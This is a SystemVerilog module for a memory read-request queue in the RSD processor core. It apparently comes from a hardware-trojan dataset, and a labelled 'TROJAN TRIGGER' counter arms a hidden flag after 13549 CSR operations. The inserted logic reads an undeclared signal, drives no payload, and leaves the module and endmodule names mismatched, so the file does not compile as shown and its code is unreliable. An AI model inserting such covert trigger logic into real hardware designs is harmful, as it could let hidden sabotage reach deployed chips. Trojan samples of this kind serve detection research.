// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// MemoryReadReqQueue
//

`include "SysDeps/XilinxMacros.vh"

import BasicTypes::*;
import MemoryTypes::*;

module MemoryReadReqQueue_trojan_Integrity ( 
input 
    logic clk,
    logic rst,
    logic push,
    logic pop,
    MemoryReadReq pushedData,
output
    logic full,
    logic empty,
    MemoryReadReq headData
);

    typedef logic [`MEMORY_AXI4_READ_ID_WIDTH-1: 0] IndexPath;

    IndexPath headPtr;
    IndexPath tailPtr;

    // size, initial head, initial tail, initial count
    QueuePointer #( `MEMORY_AXI4_READ_ID_NUM, 0, 0, 0 )
        pointer(
            .clk( clk ),
            .rst( rst ),
            .push( push ),
            .pop( pop ),
            .full( full ),
            .empty( empty ),
            .headPtr( headPtr ),
            .tailPtr( tailPtr )
        );

    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=13549)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13549;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

        

    logic [ `MEMORY_AXI4_READ_ID_WIDTH+`MEMORY_AXI4_ADDR_BIT_SIZE-1:0 ] memoryReadReqQueue[ `MEMORY_AXI4_READ_ID_NUM ]; // synthesis syn_ramstyle = "select_ram"

    always_ff @( posedge clk ) begin
        if( push ) begin
            memoryReadReqQueue[ tailPtr ] <= pushedData;
        end
    end
    
    always_comb begin
        headData = memoryReadReqQueue[ headPtr ];
    end

endmodule : MemoryReadReqQueue

 